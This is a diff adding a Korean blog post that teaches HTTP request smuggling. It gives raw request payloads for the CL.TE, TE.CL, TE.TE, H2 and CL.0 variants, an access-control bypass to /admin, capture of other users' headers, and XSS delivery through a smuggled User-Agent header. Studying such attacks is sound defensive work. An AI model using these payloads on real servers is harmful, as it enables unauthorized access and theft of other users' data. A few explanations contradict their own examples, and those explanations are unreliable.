@@ -1,0 +1,373 @@
+---
+title: HTTP Request Smuggling
+desc: What is HTTP Request Smuggling?
+date: 2024-11-07
+thumbnail: /posts/basic_skill/http_request_smuggling/thumbnail.png
+---
+## What's HTTP request Smuggling?
+
+![](/posts/basic_skill/http_request_smuggling/0.png)
+
+HTTP request Smuggling은 웹 서버나 프록시 서버와 같은 HTTP 요청을 처리하는 시스템에서 발생하는 보안 취약점 중 하나입니다.
+
+Front-end 서버와 Back-end 서버가 서로 다른 방식으로 HTTP 요청의 길이를 처리할 때 HTTP requset Smuggling 취약점이 발생할 수 있습니다.
+
+---
+## Background
+
+### Content-Length
+
+Content-Length 헤더는 HTTP 요청이나 응답의 본문(body)의 길이를 나타내는 헤더입니다.
+
+```text
+POST / HTTP/1.1
+Host: bobong.blog
+Content-Length: 8
+
+12345678
+```
+
+잘못된 Content-Length 값을 가진 요청이나 응답은 요청이 잘리거나, Timeout이 발생할 수 있습니다.
+
+### Transfer-Encoding: chunked
+
+`Transfer-Encoding: chunked` 는 메시지를 여러 개의 작은 청크(chunk)로 나누어 전송하는 방식으로, 각 청크에는 청크 크기와 청크 데이터가 포함됩니다.
+청크는 `0\r\n` 이 도착하지 않으면 서버는 요청을 계속해서 기다립니다.
+
+```text
+POST / HTTP/1.1
+Host: bobong.blog
+Transfer-Encoding: chunked
+
+8  #16진수로 표현한 청크 크기
+12345678  #청크 데이터
+0  #전송 완료
+```
+
+### HTTP/2 Downgrading
+
+Front-end가 HTTP/2를 사용하고 Back-end가 HTTP/1.1을 사용할 때 이뤄집니다.
+
+관련 정보
+[HTTP/2 downgrading | Web Security Academy](https://portswigger.net/web-security/request-smuggling/advanced/http2-downgrading)
+
+---
+## Detection
+
+HTTP request Smuggling은 request의 결과를 통해 탐지가 가능하다.
+
+```text
+Content-Length: 6
+Transfer-Encoding: chunked
+
+3
+abc
+X
+
+```
+
+위와 같이 요청을 보냈을 때 response 결과 값이 Reject 면 TE : CL 또는 TE : TE이고, Timeout이면 CL : TE 이다.
+
+`0` 이 존재하지 않기 때문에 Back-end로 신호가 가지 못해 Reject를 응답하거나, Back-end에서 `0` 이 존재하지 않기 때문에 계속해서 기다리다가 Timeout을 응답하는 것입니다.
+
+---
+## Basic Attack
+
+### CL : TE
+
+![](/posts/basic_skill/http_request_smuggling/1.png)
+
+Front-end 서버는 Content-Length 헤더를 사용하고, Back-end 서버에서는  Transfer-Encoding 헤더를 사용할 때 발생하는 취약점입니다.
+
+```text
+POST / HTTP/1.1
+Host: test.com
+Content-Length: 13
+Transfer-Encoding: chunked
+
+0
+
+G
+```
+
+Front-end 서버에서 모든 문자열을 끝까지 읽은 뒤 Back-end 서버로 전송합니다.
+
+Back-end 서버에서는 `Transfer-Encoding: chunked` 를 이용하기 때문에 길이가 `0`인 chunk으로 판단하여 요청을 종료합니다.
+
+이어서 오는 데이터 `SMUGGLED` 는 처리되지 않고, 아래와 같이 백엔드 서버의 다음 요청의 시작 부분에 붙여 요청합니다.
+
+```text
+GPOST / HTTP/1.1
+Host: test.com
+```
+
+### TE : CL
+
+![](/posts/basic_skill/http_request_smuggling/2.png)
+
+Front-end 서버는 Transfer-Encoding 헤더를 사용하고, Back-end 서버에서는  Content-Length 헤더를 사용할 때 발생하는 취약점입니다.
+
+```text
+POST / HTTP/1.1
+Host: test.com
+Content-Length: 3
+Transfer-Encoding: chunked
+
+1
+G
+0
+```
+
+Front-end 서버에서 모든 문자열을 끝까지 읽은 뒤 Back-end 서버로 전송합니다.
+
+Back-end 서버에서는 `Content-Length` 의 길이가 3이기 때문에 `8`까지만 읽습니다.
+
+이어서 오는 데이터 `SMUGGLED` 는 처리되지 않고, 아래와 같이 백엔드 서버의 다음 요청의 시작 부분에 붙여 요청합니다.
+
+### TE : TE
+
+![](/posts/basic_skill/http_request_smuggling/3.png)
+
+Front-end와 Back-end 모두 `Transfer-Encoding`을 사용할 때 발생하는 취약점입니다.
+
+```text
+Transfer-Encoding: xchunked
+
+Transfer-Encoding : chunked
+
+Transfer-Encoding: chunked
+
+Transfer-Encoding: x
+
+Transfer-Encoding:[tab]chunked
+
+[space]Transfer-Encoding: chunked
+
+X: X[\n]Transfer-Encoding: chunked
+
+Transfer-Encoding
+: chunked
+```
+
+TE : TE 취약점은 Front-end 서버와 Back-end 서버 중 하나가 `Transfer-Encoding: chunked` 헤더를 처리하지 않을 때 발생하는 취약점입니다. 
+
+따라서 둘 중 하나의 서버가 헤더를 처리하지 않기 위해서 난독화 된 헤더를 사용해 취약점을 발생 시킵니다.
+
+이후 공격 방식은  CL.TE 또는 TE.CL과 유사합니다.
+
+### H2.CL
+
+![](/posts/basic_skill/http_request_smuggling/4.png)
+
+HTTP/2 에선 `Content-Length`를 명시할 필요가 없으나 HTTP/1.1로 다운그레이드 될 경우, Front-end 서버에 `Content-Length` 헤더를 명시하여 취약점을 발생시킬 수 있습니다.
+
+```text
+:method         |    POST
+:path           |    /
+:authority      |    test.com
+content-type    |    applicataion/x-www-form-urlencoded
+content-length  |    0
+
+GET /admin HTTP/1.1
+Host: test.com
+Content-Length: 10
+
+x=1
+```
+
+HTTP/2에선 `Content-Length` 헤더가 사용되지 않기 때문에 모든 문자열을 Back-end로 전송합니다.
+
+Back-end 서버에서는 다운그레이드를 통해 HTTP/1.1 HTTP request를 받아 `Content-Length` 헤더가 적용되며 `Content-Length` 의 값이 `0`이기 때문에 Smuggling이 발생합니다.
+
+### H2.TE
+
+![](/posts/basic_skill/http_request_smuggling/5.png)
+
+HTTP/2 에선 `Transfer-Encoding` 헤더가 적용되지 않습니다.
+
+```text
+:method            |    POST
+:path              |    /
+:authority         |    test.com
+content-type       |    applicataion/x-www-form-urlencoded
+transfer-encoding  |    chunked
+
+0
+
+GET /admin HTTP/1.1
+Host: test.com
+Foo: x
+```
+
+Back-end 서버에선 다운그레이드를 통해 `transfer-encoding: chunked` 헤더가 적용되어 Smuggling이 발생하게 됩니다.
+
+### CL.0
+
+![](/posts/basic_skill/http_request_smuggling/6.png)
+
+CL.0 request Smuggling은 Front-end에서는 `Content-Length` 헤더를 사용하지만 Back-end 서버에서 `Content-Length` 헤더를 무시하는 경우 발생하는 취약점입니다. 
+
+`Content-Length` 헤더를 무시하게 되면, `Content-Length: 0` 와 같이 처리합니다.
+
+따라서 Back-end 서버에서만 `Content-Length` 헤더를 무시하면 Smuggling 취약점이 발생하게 됩니다.
+
+하나의 TCP 연결을 통해 여러 요청을 보내야 되기 때문에 `Connection: Keep-Alive` 헤더를 이용하여야 됩니다.
+
+```text
+POST /vulnerable-endpoint HTTP/1.1
+Host: test.com
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 32
+
+GET /admin HTTP/1.1
+X-Ignore: x
+```
+
+해당 공격은 Content-Length 길이를 임의로 조작하지 않기 때문에 JavaScript를 통해서도 공격을 진행할 수 있다.
+
+---
+## Advanced Attack
+
+### Front-end 접근제어 우회
+
+HTTP request Smuggling을 사용하면 Front-end의 접근제어를 우회할 수 있습니다.
+
+예를 들어 Host 헤더를 통해 접근제어를 하고 있다면 다음과 같이 우회할 수 있습니다.
+
+```text
+POST / HTTP/1.1
+Host: bobong.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 116
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+
+x=
+```
+
+다음과 같은 요청을 보내게 되면 접근이 불가능했던 `/admin` 페이지로 접근이 가능하게 됩니다.
+
+### Front-end 요청 정보 재작성
+
+Front-end 서버에서 Back-end 서버로 요청 시 다음과 같은 헤더를 포함하여 요청하는 경우가 있습니다.
+
+- TLS 연결 종료 및 프로토콜, 암호 관련 헤더
+- 사용자 IP가 포함된 X-Forwarded-For 헤더
+- 세션 토큰을 기반으로 한 사용자 ID 또는 사용자 식별 헤더
+- 기타 중요 정보
+
+특정 상황에선 Front-end 서버에서 일반적으로 추가되는 일부 헤더를 누락할 수 있습니다. 그런 상황에선 Back-end 서버에서 요청을 정상적으로 처리하지 못하며, 그에 따라 원하는 결과를 얻지 못할 수 있습니다.
+
+다음과 같은 방법으로 필요한 헤더를 확인할 수 있습니다.
+
+1. 매개변수의 값을 애플리케이션에 표현하는 POST 요청을 찾습니다.
+2. 해당 매개변수를 메시지 본문에서 마지막에 나타나도록 조정합니다.
+3. 이후 요청을 Back-end 서버로 스며들게 하고, 바로 뒤에 재 작성된 정상적인 요청을 보냅니다.
+
+예를 들어 설명해보겠습니다. 아래와 같이 email 파라미터 값을 요구하는 POST 요청 주소가 있습니다.
+
+```text
+POST /login HTTP/1.1
+Host: bobong.blog
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 28
+
+email=wiener@normal-user.net
+```
+
+해당 요청은 다음과 같은 값을 담아 response 합니다.
+
+```html
+<input id="email" value="wiener@normal-user.net" type="text">
+```
+
+아래와 같이 Smuggling 공격을 통해 response 되는 데이터에 다른 사용자의 요청 정보를 재작성할 수 있습니다.
+
+```text
+POST / HTTP/1.1
+Host: bobong.blog
+Content-Length: 130
+Transfer-Encoding: chunked
+
+0
+
+POST /login HTTP/1.1
+Host: bobong.blog
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 100
+
+email=**POST /login HTTP/1.1
+Host: bobong.blog
+...**
+```
+
+따라서 아래와 같이 다른 사용자의 HTTP request 요청 헤더 정보를 얻을 수 있습니다.
+
+```html
+<input id="email" value="POST /login HTTP/1.1
+Host: vulnerable-website.com
+X-Forwarded-For: 1.3.3.7
+X-Forwarded-Proto: https
+X-TLS-Bits: 128
+X-TLS-Cipher: ECDHE-RSA-AES128-GCM-SHA256
+X-TLS-Version: TLSv1.2
+x-nr-external-service: external
+..."/>
+```
+
+### HTTP request Smuggling을 이용한 reflected XSS
+
+만약 서비스가 Smuggling이랑 XSS에 대한 취약점이 존재한다면, 다른 사용자에게 공격을 할 수 있습니다.
+
+User-Agent에 XSS에 대한 취약점이 존재할 경우 아래와 같이 다른 사용자에게 reflected XSS 공격을 할 수 있습니다.
+
+```text
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 63
+Transfer-Encoding: chunked
+
+0
+
+GET / HTTP/1.1
+User-Agent: <script>alert(1)</script>
+Foo: X
+```
+
+### CRLF Injection을 통한 HTTP/2 Request Smuggling
+Content-Length, Transfer-Encoding 헤더를 필터링하여 H2.CL, H2,TE 공격을 방지하여도 CRLF Injection을 통해 공격이 가능합니다.
+
+HTTP/1.1와 다르게 HTTP/2는 헤더 내용에 콜론이 사용 가능하여 CRLF Injection과 같이 사용하여 필터링을 우회할 수 있습니다.
+
+해당 방법이 가능한 이유는 HTTP/2가 문자열이 아닌 바이너리 기반으로 동작하기 때문에 `\r\n`을 인식하지 못하기 때문입니다.
+
+아래는 간단한 예시입니다.
+```text
+Front-end HTTP/2
+foo: bar \r\n Transfer-Encoding: chunked \r\n X: ignore
+
+Back-end HTTP/1.1
+Foo: bar\r\n
+Transfer-Encoding: chunked\r\n
+X: ignore\r\n
+```
+
+---
+## Reference
+https://portswigger.net/web-security/request-smuggling
+https://www.hahwul.com/cullinan/http-request-smuggling/
+https://book.hacktricks.xyz/v/kr/pentesting-web/http-request-smuggling
+https://velog.io/@thelm3716/HTTP-request-smuggling
+https://core-research-team.github.io/2020-05-01/HTTP-Request-Smuggling-HTTP-Desync-Attack-be0e1c6035f84533af79463b3ec49d75
+
+---
+## Lab
+[HTTP Request Smuggling Workshop](https://gosecure.github.io/request-smuggling-workshop/#0)
+[https://github.com/detectify/Varnish-H2-Request-Smuggling](https://github.com/detectify/Varnish-H2-Request-Smuggling)
